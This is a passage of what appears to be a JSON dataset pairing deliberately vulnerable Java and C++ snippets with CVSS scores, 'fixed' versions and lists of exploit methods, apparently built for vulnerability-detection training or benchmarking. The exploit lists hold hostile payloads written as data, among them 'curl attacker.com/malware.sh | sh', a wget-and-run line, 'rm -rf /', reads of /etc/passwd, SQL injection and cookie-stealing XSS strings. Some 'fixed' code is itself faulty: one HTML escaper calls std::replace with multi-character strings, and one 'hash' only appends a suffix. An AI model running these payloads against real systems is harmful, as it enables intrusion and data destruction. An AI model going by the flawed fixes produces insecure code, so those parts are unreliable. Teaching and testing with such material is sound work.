        "fixed_code": "public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\n    HttpSession session = request.getSession(true);\n    session.invalidate();\n    session = request.getSession(true);\n    Cookie sessionCookie = new Cookie(\"JSESSIONID\", session.getId());\n    sessionCookie.setPath(\"\");\n    sessionCookie.setHttpOnly(true);\n    sessionCookie.setSecure(true);\n    response.addCookie(sessionCookie);\n    return \"Session fixed\";\n}",
        "exploit_ways": [
            "An attacker could set a specific JSESSIONID cookie to hijack the user's session.",
            "By setting a predictable JSESSIONID, an attacker can guess and use it for unauthorized access if the server reuses IDs.",
            "If not set as HttpOnly and Secure, the cookie can be accessed via XSS or transferred over unencrypted connections."
        ]
    },
    "java_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "public class Example {\\n    private static int counter = 0;\\n\\n    public void increment() {\\n        int temp = counter;\\n        temp++;\\n        counter = temp;\\n    }\\n}",
        "cvss_score": 3.5,
        "fixed_code": "public class Example {\\n    private static volatile int counter = 0;\\n    private static final Object lock = new Object();\\n\\n    public void increment() {\\n        synchronized (lock) {\\n            int temp = counter;\\n            temp++;\\n            counter = temp;\\n        }\\n    }\\n}",
        "exploit_ways": [
            "Multiple threads can cause the counter to have an incorrect value due to unsynchronized access.",
            "An attacker could create a large number of threads to manipulate the counter's state unpredictably.",
            "Race conditions may lead to inconsistent data states, causing application logic failures."
        ]
    },
    "java_47": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "public class UserInfo {\n    private String sensitiveData = \"Confidential Info\";\n\n    public void displayInfo(String role) {\n        if (role.equals(\"admin\")) {\n            System.out.println(sensitiveData);\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "public class UserInfo {\n    private String sensitiveData = \"Confidential Info\";\n\n    public void displayInfo(String role) {\n        if (isAdmin(role)) {\n            System.out.println(sensitiveData);\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    private boolean isAdmin(String role) {\n        return \"admin\".equals(role);\n    }\n}",
        "exploit_ways": [
            "An attacker with knowledge of the method can call displayInfo(\\\"admin\\\") to access sensitive data.",
            "If user input is not properly sanitized, an attacker could exploit this by passing a crafted string that evaluates to 'admin'.",
            "By observing or intercepting calls to displayInfo, an attacker might learn about the existence and structure of sensitive information."
        ]
    },
    "java_48": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "public class UserInfo {\n    private String username;\n    private String password;\n\n    public UserInfo(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "cvss_score": 2.1,
        "fixed_code": "public class UserInfo {\n    private String username;\n    private String password;\n\n    public UserInfo(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Username: \" + username);\n        // Password should not be exposed.\n    }\n}",
        "exploit_ways": [
            "An attacker can access the console output to retrieve usernames and passwords.",
            "If this method is called in a logging context, sensitive information could be logged.",
            "Exploitation of other vulnerabilities (e.g., SSRF) may lead to indirect exposure of this data."
        ]
    },
    "java_49": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "public String fetchUrl(String url) throws IOException {\n    URL obj = new URL(url);\n    HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n    String inputLine;\n    StringBuffer response = new StringBuffer();\n\n    while ((inputLine = in.readLine()) != null) {\n        response.append(inputLine);\n    }\n    in.close();\n    return response.toString();\n}",
        "cvss_score": 6.5,
        "fixed_code": "public String fetchUrl(String url) throws IOException, URISyntaxException {\n    URI uri = new URI(url);\n    if (!\"http\".equals(uri.getScheme()) && !\"https\".equals(uri.getScheme())) {\n        throw new IllegalArgumentException(\"Only HTTP/HTTPS URLs are allowed.\");\n    }\n    URL obj = uri.toURL();\n    HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n    String inputLine;\n    StringBuffer response = new StringBuffer();\n\n    while ((inputLine = in.readLine()) != null) {\n        response.append(inputLine);\n    }\n    in.close();\n    return response.toString();\n}",
        "exploit_ways": [
            "An attacker can provide a URL pointing to an internal service to exfiltrate sensitive data.",
            "By providing file:// URLs, the attacker could read local files on the server.",
            "Exploiting misconfigured proxies or services accessible only internally can be attempted."
        ]
    },
    "c++_0": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\n#include <string>\n#include <sstream>\n\nvoid processSerializedData(const std::string& data) {\n    std::istringstream iss(data);\n    int type;\n    iss >> type;\n    if (type == 1) {\n        std::string objectData;\n        getline(iss, objectData);\n        // Simulate deserialization\n        std::cout << \"Deserialized Object: \" << objectData << std::endl;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <sstream>\n#include <vector>\n\nvoid processSerializedData(const std::string& data) {\n    std::istringstream iss(data);\n    int type;\n    if (!(iss >> type)) {\n        throw std::invalid_argument(\"Invalid type\");\n    }\n    iss.ignore(); // Ignore the newline character after integer\n    if (type == 1) {\n        std::string objectData;\n        if (!getline(iss, objectData)) {\n            throw std::invalid_argument(\"Failed to read object data\");\n        }\n        // Simulate safe deserialization\n        std::vector<std::string> allowedObjects = {\"safeObject1\", \"safeObject2\"};\n        if (std::find(allowedObjects.begin(), allowedObjects.end(), objectData) != allowedObjects.end()) {\n            std::cout << \"Deserialized Object: \" << objectData << std::endl;\n        } else {\n            throw std::invalid_argument(\"Unauthorized deserialization attempt\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a crafted input to deserialize unexpected data, leading to potential code execution.",
            "By injecting specific strings, an attacker might trick the program into processing malicious data masquerading as valid objects.",
            "Crafted inputs can lead to unauthorized access or manipulation of system resources during deserialization."
        ]
    },
    "c++_1": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nbool authenticate(const std::string& username, const std::string& password) {\n    if (username == \"admin\" && password == \"securepassword123\") {\n        return true;\n    }\n    return false;\n}\n\nint main() {\n    std::string user, pass;\n    std::cout << \"Enter username: \";\n    std::cin >> user;\n    std::cout << \"Enter password: \";\n    std::cin >> pass;\n\n    if (authenticate(user, pass)) {\n        std::cout << \"Access granted.\" << std::endl;\n    } else {\n        std::cout << \"Access denied.\" << std::endl;\n    }\n\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <map>\n#include <functional>\n\nbool authenticate(const std::string& username, const std::string& password) {\n    static std::map<std::string, std::string> users = {{\"admin\", \"hashed_securepassword123\"}};\n    auto hash_password = [](const std::string& pass) -> std::string {\n        // Placeholder for actual hashing logic\n        return pass + \":salted:\";\n    };\n    return users.find(username) != users.end() && users[username] == hash_password(password);\n}\n\nint main() {\n    std::string user, pass;\n    std::cout << \"Enter username: \";\n    std::cin >> user;\n    std::cout << \"Enter password: \";\n    std::cin >> pass;\n\n    if (authenticate(user, pass)) {\n        std::cout << \"Access granted.\" << std::endl;\n    } else {\n        std::cout << \"Access denied.\" << std::endl;\n    }\n\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can brute force the password knowing the username 'admin'.",
            "If hardcoded passwords are used across services, an attacker could attempt to use this password elsewhere.",
            "Using default or easily guessable credentials could allow unauthorized access."
        ]
    },
    "c++_2": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\n\nint main() {\n    std::string command;\n    std::cout << \"Enter command to execute: \";\n    std::getline(std::cin, command);\n    system(command.c_str());\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <cstdlib>\n#include <iostream>\n#include <vector>\n\nint main() {\n    std::string command;\n    std::cout << \"Enter command to execute: \";\n    std::getline(std::cin, command);\n    if (command == \"ls\" || command == \"whoami\") {\n        system(command.c_str());\n    } else {\n        std::cout << \"Command not allowed.\" << std::endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_3": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "#include <cstdlib>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    if (getuid() != 0) {\n        printf(\"This program needs to be run as root.\\n\");\n        return 1;\n    }\n    const char* command = argv[1];\n    system(command);\n    return 0;\n}",
        "cvss_score": 7.8,
        "fixed_code": "#include <cstdlib>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    if (getuid() != 0) {\n        printf(\"This program needs to be run as root.\\n\");\n        return 1;\n    }\n    const char* allowed_commands[] = {\"/bin/ls\", \"/usr/bin/id\", NULL};\n    for (int i = 0; allowed_commands[i] != NULL; i++) {\n        if (strcmp(argv[1], allowed_commands[i]) == 0) {\n            system(argv[1]);\n            return 0;\n        }\n    }\n    printf(\"Command not allowed.\\n\");\n    return 1;\n}",
        "exploit_ways": [
            "An attacker could provide '/bin/sh' to get a root shell.",
            "Using 'rm -rf /' as the command would delete all files on the system.",
            "Providing 'wget http://malicious.com/script.sh && bash script.sh' could download and execute malware."
        ]
    },
    "c++_4": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nclass SystemCommandExecutor {\\npublic:\\n    void executeCommand(const std::string& cmd) {\\n        system(cmd.c_str());\\n    }\\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nclass SystemCommandExecutor {\\npublic:\\n    void executeCommand(const std::string& cmd) {\\n        if (cmd == \"allowed_command\") {\\n            system(cmd.c_str());\\n        } else {\\n            std::cout << \"Command not allowed\" << std::endl;\\n        }\\n    }\\n};",
        "exploit_ways": [
            "User could input 'ls -la' to list all files, including hidden ones.",
            "Could use '; rm -rf /' to delete all files on the system.",
            "Could chain commands like 'whoami; cat /etc/passwd' to escalate privileges and leak user information."
        ]
    },
    "c++_5": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "#include <iostream>\n#include <mysql.h>\n\nvoid queryDatabase(const std::string& userInput) {\n    MYSQL* conn;\n    MYSQL_RES* res;\n    MYSQL_ROW row;\n    conn = mysql_init(NULL);\n    mysql_real_connect(conn, \"localhost\", \"user\", \"password\", \"database\", 0, NULL, 0);\n    std::string query = \"SELECT * FROM users WHERE username='\" + userInput + \"';\";\n    mysql_query(conn, query.c_str());\n    res = mysql_use_result(conn);\n\n    while ((row = mysql_fetch_row(res)) != NULL) {\n        std::cout << row[0] << \"\\t\" << row[1] << std::endl;\n    }\n    mysql_free_result(res);\n    mysql_close(conn);\n}",
        "cvss_score": 8.9,
        "fixed_code": "#include <iostream>\n#include <mysql.h>\n\nvoid queryDatabase(const std::string& userInput) {\n    MYSQL* conn;\n    MYSQL_STMT* stmt;\n    MYSQL_BIND bind[1];\n    MYSQL_RES* res;\n    MYSQL_ROW row;\n    char username[256] = {0};\n    unsigned long length[1] = {0};\n    my_bool is_null[1] = {0}, error[1] = {0};\n\n    strncpy(username, userInput.c_str(), sizeof(username) - 1);\n    conn = mysql_init(NULL);\n    mysql_real_connect(conn, \"localhost\", \"user\", \"password\", \"database\", 0, NULL, 0);\n    const char* query = \"SELECT * FROM users WHERE username=?;\";\n\n    stmt = mysql_stmt_init(conn);\n    mysql_stmt_prepare(stmt, query, strlen(query));\n\n    bind[0].buffer_type= MYSQL_TYPE_STRING;\n    bind[0].buffer= (char *)username;\n    bind[0].is_null= is_null;\n    bind[0].length = length;\n\n    mysql_stmt_bind_param(stmt, bind);\n    mysql_stmt_execute(stmt);\n\n    res = mysql_store_result(conn);\n    while ((row = mysql_fetch_row(res)) != NULL) {\n        std::cout << row[0] << \"\\t\" << row[1] << std::endl;\n    }\n\n    mysql_free_result(res);\n    mysql_stmt_close(stmt);\n    mysql_close(conn);\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to retrieve all user data.",
            "They can use ' UNION SELECT username, password FROM users --' to extract login credentials.",
            "Input like \"'; DROP TABLE users; --\" can delete the users table."
        ]
    },
    "c++_7": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <fstream>\n#include <string>\n\nclass FileReader {\npublic:\n    std::string readFile(const std::string& filename) {\n        std::ifstream file(filename);\n        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n        return content;\n    }\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <fstream>\n#include <string>\n#include <filesystem>\n\nclass FileReader {\npublic:\n    std::string readFile(const std::string& filename) {\n        if (!std::filesystem::exists(filename)) {\n            throw std::runtime_error(\"File does not exist\");\n        }\n        if (std::filesystem::path(filename).parent_path() != \"\") {\n            throw std::runtime_error(\"Path traversal detected\");\n        }\n        std::ifstream file(filename);\n        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n        return content;\n    }\n};",
        "exploit_ways": [
            "An attacker can input '../secret.txt' to access files outside the intended directory.",
            "Could use '..\\..\\flag.txt' on Windows systems to retrieve sensitive data.",
            "Path traversal might allow reading of system configuration or user credentials stored in adjacent directories."
        ]
    },
    "c++_8": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\n\nint main() {\n    std::string command;\n    std::cout << \"Enter system command: \";\n    std::cin >> command;\n    std::system(command.c_str());\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <iostream>\n#include <vector>\n\nint main() {\n    std::string cmd;\n    std::cout << \"Enter system command: \";\n    std::cin >> cmd;\n    std::vector<std::string> allowed_commands = {\"ls\", \"pwd\", \"whoami\"};\n    if (std::find(allowed_commands.begin(), allowed_commands.end(), cmd) != allowed_commands.end()) {\n        system(cmd.c_str());\n    } else {\n        std::cout << \"Command not allowed.\" << std::endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete all files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c++_9": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    int result = system(command.c_str());\\n    if (result == 0) {\\n        std::cout << \"Command executed successfully.\" << std::endl;\\n    } else {\\n        std::cout << \"Command execution failed.\" << std::endl;\\n    }\\n    return 0;\\n}",
        "cvss_score": 9.8,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    if (command == \\\"allowed_command\\\") {\\n        int result = system(command.c_str());\\n        if (result == 0) {\\n            std::cout << \"Command executed successfully.\" << std::endl;\\n        } else {\\n            std::cout << \"Command execution failed.\" << std::endl;\\n        }\\n    } else {\\n        std::cout << \"Command not allowed.\" << std::endl;\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_10": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\n\nvoid executeCommand() {\n    char command[256];\n    std::cout << \"Enter command to execute: \";\n    std::cin.getline(command, sizeof(command));\n    system(command);\n}",
        "cvss_score": 8.8,
        "fixed_code": "#include <cstdlib>\n#include <iostream>\n\nvoid executeCommand() {\n    const char* allowedCommands[] = {\"ls\", \"whoami\"};\n    int numAllowedCommands = sizeof(allowedCommands) / sizeof(allowedCommands[0]);\n    std::string command;\n    std::cout << \"Enter command to execute: \";\n    std::cin >> command;\n\n    for (int i = 0; i < numAllowedCommands; ++i) {\n        if (command == allowedCommands[i]) {\n            system(command.c_str());\n            return;\n        }\n    }\n    std::cout << \"Command not allowed\" << std::endl;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete all files on the server.",
            "Could use 'curl attacker.com/malware.sh | sh' to download and execute malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c++_11": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdio>\n#include <cstring>\n\nvoid executeCommand(const char* cmd) {\n    char buffer[256];\n    snprintf(buffer, sizeof(buffer), \"echo %s\", cmd);\n    system(buffer);\n}",
        "cvss_score": 7.2,
        "fixed_code": "#include <cstdio>\n#include <cstring>\n\nvoid executeCommand(const char* cmd) {\n    if (strcmp(cmd, \"allowed_command\") == 0) {\n        system(\"echo allowed_command\");\n    } else {\n        printf(\"Command not allowed\\n\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'whoami' to leak the current user information.",
            "Could use '; rm -rf /' to delete all files in the root directory.",
            "Chaining commands like '; cat /etc/passwd' can leak system passwords."
        ]
    },
    "c++_12": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "#include <iostream>\n#include <cstring>\n\nvoid vulnerableFunction(const char* input) {\n    char buffer[10];\n    strcpy(buffer, input);\n}\n\nint main() {\n    const char* userInput = \"This is a very long string that will cause a buffer overflow\";\n    vulnerableFunction(userInput);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <cstring>\n\nvoid safeFunction(const char* input) {\n    char buffer[100];\n    strncpy(buffer, input, sizeof(buffer) - 1);\n    buffer[sizeof(buffer) - 1] = '\\0';\n}\n\nint main() {\n    const char* userInput = \"This is a very long string that will cause a buffer overflow\";\n    safeFunction(userInput);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can craft an input longer than 10 characters to overwrite adjacent memory, potentially leading to code execution.",
            "Overwriting the return address on the stack can redirect the program flow to malicious code.",
            "Using a buffer overflow, an attacker might corrupt other variables or data structures in the same memory space."
        ]
    },
    "c++_13": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\n#include <sstream>\n#include <string>\nclass User {\npublic:\n    std::string name;\n    int age;\n    void deserialize(const std::string& data) {\n        std::istringstream iss(data);\n        iss >> name >> age;\n    }\n};\n\nint main() {\n    User user;\n    std::string input = \"admin 18\"; // Simulated malicious input\n    user.deserialize(input);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <sstream>\n#include <string>\nclass User {\npublic:\n    std::string name;\n    int age;\n    bool deserialize(const std::string& data) {\n        std::istringstream iss(data);\n        if (!(iss >> name >> age)) {\n            return false; // Return false on failure\n        }\n        return true; // Return true on success\n    }\n};\n\nint main() {\n    User user;\n    std::string input = \"admin 18\"; // Simulated malicious input\n    if (!user.deserialize(input)) {\n        std::cerr << \"Deserialization failed.\" << std::endl;\n        return 1;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide malformed input to cause undefined behavior or crashes.",
            "Crafting specific inputs could lead to buffer overflows if the code is expanded unsafely in future.",
            "If integrated into a larger system, improper deserialization could allow bypassing authentication checks."
        ]
    },
    "c++_14": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\n\\npublic:\\n    WebSession(const std::string& id) : sessionId(id) {}\\n\\n    void transferFunds(const std::string& targetAccount, double amount) {\\n        // Simulate transferring funds to another account\\n        std::cout << \"Transferring \" << amount << \" to account \" << targetAccount << \" using session: \" << sessionId << std::endl;\\n    }\\n};",
        "cvss_score": 6.8,
        "fixed_code": "#include <iostream>\\n#include <string>\\n\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\n    std::string csrfToken;\\n\\npublic:\\n    WebSession(const std::string& id, const std::string& token) : sessionId(id), csrfToken(token) {}\\n\\n    void transferFunds(const std::string& targetAccount, double amount, const std::string& token) {\\n        if (token != csrfToken) {\\n            std::cout << \"Invalid CSRF Token\" << std::endl;\\n            return;\\n        }\\n        // Simulate transferring funds to another account\\n        std::cout << \"Transferring \" << amount << \" to account \" << targetAccount << \" using session: \" << sessionId << std::endl;\\n    }\\n};",
        "exploit_ways": [
            "An attacker can craft a malicious link that, when clicked by an authenticated user, transfers funds without their knowledge.",
            "Using JavaScript, an attacker can automatically submit a form to the vulnerable endpoint on behalf of an authenticated user.",
            "By intercepting network traffic, an attacker could replicate a valid request and replay it with different parameters to perform unauthorized actions."
        ]
    },
    "c++_15": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\\n#include <sstream>\\n#include <boost/archive/text_iarchive.hpp>\\n#include <boost/serialization/export.hpp>\\n\\nclass Data {\\npublic:\\n    int value;\\n    template<class Archive>\\n    void serialize(Archive & ar, const unsigned int version) {\\n        ar \\u0026 value;\\n    }\\n};\\n\\nBOOST_SERIALIZATION_ASSUME_ABSTRACT(Data)\\n\\nvoid deserializeData(const std::string& dataStr) {\\n    std::istringstream iss(dataStr);\\n    boost::archive::text_iarchive ia(iss);\\n    Data* data = nullptr;\\n    ia >> data;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <sstream>\\n#include <boost/archive/text_iarchive.hpp>\\n#include <boost/serialization/export.hpp>\\n\\nclass Data {\\npublic:\\n    int value;\\n    template<class Archive>\\n    void serialize(Archive & ar, const unsigned int version) {\\n        ar \\u0026 value;\\n    }\\n};\\n\\nBOOST_CLASS_EXPORT(Data)\\n\\nvoid deserializeData(const std::string& dataStr) {\\n    try {\\n        std::istringstream iss(dataStr);\\n        boost::archive::text_iarchive ia(iss);\\n        Data* data = new Data();\\n        ia >> *data;\\n        // Use the deserialized data safely here\\n        delete data;\\n    } catch (const std::exception& e) {\\n        std::cerr << \"Deserialization failed: \" << e.what() << std::endl;\\n    }\\n}",
        "exploit_ways": [
            "An attacker can craft a malicious serialized object to execute arbitrary code when deserialized.",
            "By manipulating the serialized data, an attacker might be able to exploit memory corruption vulnerabilities.",
            "A crafted payload could lead to denial of service by crashing the application during deserialization."
        ]
    },
    "c++_16": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\npublic:\\n    WebSession(const std::string& id) : sessionId(id) {}\\n    void transferFunds(int amount, const std::string& recipient) {\\n        if (amount > 0) {\\n            std::cout << \"Transferring \" << amount << \" to \" << recipient << \" using session: \" << sessionId << std::endl;\\n        }\\n    }\\n};",
        "cvss_score": 6.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\nclass WebSession {\\nprivate:\\n    std::string sessionId;\\n    std::string csrfToken;\\npublic:\\n    WebSession(const std::string& id, const std::string& token) : sessionId(id), csrfToken(token) {}\\n    void transferFunds(int amount, const std::string& recipient, const std::string& token) {\\n        if (amount > 0 && token == csrfToken) {\\n            std::cout << \"Transferring \" << amount << \" to \" << recipient << \" using session: \" << sessionId << std::endl;\\n        } else {\\n            std::cout << \"Invalid CSRF Token\" << std::endl;\\n        }\\n    }\\n};",
        "exploit_ways": [
            "An attacker could create a malicious link to trick the user into transferring funds without their knowledge.",
            "The attacker can use social engineering tactics to get the victim to visit a crafted URL that performs unauthorized actions in their session.",
            "By injecting a script on a trusted website, an attacker can automate the process of sending CSRF requests to transfer funds."
        ]
    },
    "c++_17": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nvoid displayMessage(const std::string& message) {\\n    std::cout << \"<div>\" + message + \"</div>\" << std::endl;\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your message: \";\\n    getline(std::cin, userInput);\\n    displayMessage(userInput);\\n    return 0;\\n}",
        "cvss_score": 6.1,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <algorithm>\\n\\nvoid escapeHTML(std::string& str) {\\n    std::replace(str.begin(), str.end(), '&', '&amp;');\\n    std::replace(str.begin(), str.end(), '<', '&lt;');\\n    std::replace(str.begin(), str.end(), '>', '&gt;');\\n    std::replace(str.begin(), str.end(), '\\\"', '&quot;');\\n}\\n\\nvoid displayMessage(const std::string& message) {\\n    std::string safe_message = message;\\n    escapeHTML(safe_message);\\n    std::cout << \"<div>\" + safe_message + \"</div>\" << std::endl;\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your message: \";\\n    getline(std::cin, userInput);\\n    displayMessage(userInput);\\n    return 0;\\n}",
        "exploit_ways": [
            "User can input '<script>alert(\\'XSS\\')</script>' to execute a popup in the browser.",
            "Can inject script tags with malicious JavaScript to steal cookies or session data.",
            "Use '<img src=\\\"x\\\" onerror=\\\"alert(1)\\\">' to demonstrate DOM-based XSS."
        ]
    },
    "c++_18": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    system(command.c_str());\\n    return 0;\\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nint main() {\\n    std::string command;\\n    std::cout << \"Enter a command to execute: \";\\n    std::getline(std::cin, command);\\n    if (command == \"allowed_command\") {\\n        system(command.c_str());\\n    } else {\\n        std::cout << \"Command not allowed.\";\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete all files on the system.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious scripts.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "c++_19": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdlib>\n#include <iostream>\nusing namespace std;\n\nint main() {\n    string cmd;\n    cout << \"Enter command to execute: \";\n    getline(cin, cmd);\n    system(cmd.c_str());\n    return 0;\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <iostream>\nusing namespace std;\n\nint main() {\n    string cmd;\n    cout << \"Enter command to execute: \";\n    getline(cin, cmd);\n    if (cmd == \"ls\" || cmd == \"whoami\") {\n        system(cmd.c_str());\n    } else {\n        cout << \"Command not allowed.\" << endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_20": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "#include <cstdlib>\n#include <string>\n\nvoid executeCommand(const std::string& command) {\n    if (command.substr(0, 3) == \"run\") {\n        system(command.c_str() + 4);\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <cstdlib>\n#include <string>\n\nvoid executeCommand(const std::string& command) {\n    if (command.substr(0, 3) == \"run\") {\n        const char* allowedCommands[] = {\"ls\", \"whoami\", nullptr};\n        bool isAllowed = false;\n        for (const char** cmd = allowedCommands; *cmd != nullptr; ++cmd) {\n            if (*cmd == command.substr(4)) {\n                isAllowed = true;\n                break;\n            }\n        }\n        if (isAllowed) {\n            system(command.c_str() + 4);\n        } else {\n            std::cerr << \"Command not allowed\" << std::endl;\n        }\n    }\n}",
        "exploit_ways": [
            "User could input 'run rm -rf /' to delete all files.",
            "Could use 'run curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'run ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "c++_21": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nusing namespace std;\\n\\nvoid renderPage(const string& userInput) {\\n    cout << \"<html><body>\" << endl;\\n    cout << \"User Input: \" << userInput << endl;\\n    cout << \"</body></html>\" << endl;\\n}\\n\\nint main() {\\n    string input;\\n    cout << \"Enter your name: \";\\n    getline(cin, input);\\n    renderPage(input);\\n    return 0;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\nusing namespace std;\\n\\nvoid escapeHTML(string& str) {\\n    for (size_t i = 0; i < str.length(); ++i) {\\n        if (str[i] == '<') str.replace(i, 1, \"&lt;\");\\n        else if (str[i] == '>') str.replace(i, 1, \"&gt;\");\\n        else if (str[i] == '\"') str.replace(i, 1, \"&quot;\");\\n        else if (str[i] == '&') str.replace(i, 1, \"&amp;\");\\n    }\\n}\\nvoid renderPage(const string& userInput) {\\n    string safeInput = userInput;\\n    escapeHTML(safeInput);\\n    cout << \"<html><body>\" << endl;\\n    cout << \"User Input: \" << safeInput << endl;\\n    cout << \"</body></html>\" << endl;\\n}\\n\\nint main() {\\n    string input;\\n    cout << \"Enter your name: \";\\n    getline(cin, input);\\n    renderPage(input);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can inject script tags like <script>alert('XSS')</script> to execute arbitrary JavaScript.",
            "They can use <img src=x onerror=alert(1)> to trigger an XSS event through image loading errors.",
            "Inputting <a href=javascript:alert(document.cookie)>Click me</a> allows the attacker to steal cookies via a phishing attack."
        ]
    },
    "c++_22": {
        "vulnerability_type": "Privilege Escalation",
